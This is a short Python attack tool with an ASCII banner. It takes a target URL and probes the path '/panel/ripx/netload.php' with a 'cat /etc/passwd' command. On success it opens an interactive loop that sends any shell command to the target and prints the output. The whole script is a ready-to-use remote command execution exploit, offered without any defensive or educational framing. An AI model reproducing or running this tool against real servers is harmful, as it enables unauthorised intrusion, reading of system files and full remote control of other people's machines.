import requests

print("""
    
___  ____ ____ ___ _  _ ____    ____ ____ ____ 
|__] |  | |  |  |  |\/| |___    |__/ |    |___ 
|__] |__| |__|  |  |  | |___    |  \ |___ |___ 
       
        use help for more options!                       

    """)
def main():
    

    user = input(" [ $ ] ")

    if user == "help":
        print(""" 
    [ $ ] rce { requires nothing } 
        """)
        return main()
    
    elif user == "rce":
        url = input(' url => ')
        cookies = {
        "__cfduid": "d9d07f6e425d72d04a8f94ac5d0dcf1e31617163514"
        }
        headers = {
    
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36",
    "cf-cache-status": "DYNAMIC",
    "cf-cache-status": "DYNAMIC",
    "cf-ray": "63877222bb5aee07-CDG",
    "cf-request-id": "092885a9af0000ee07ea8f6000000001",
    "content-encoding": "br",
    "content-type": "text/html; charset=UTF-8",
    "date": "Wed, 31 Mar 2021 06:15:54 GMT",

    "server": "cloudflare"
    }
        print(" Looking for Paths...")
        oop = requests.get(f"{url}/panel/ripx/netload.php?cmd=cat%20/etc/passwd", headers=headers, cookies=cookies)
        
        if "root:x" in oop.text:
            print(" Found RCE!")
            while True:
                shell = input(" Shell => ")
                oop = requests.get(f"{url}/panel/ripx/netload.php?cmd={shell}", headers=headers, cookies=cookies)
                print(oop.text)
    else:
        return main()
main()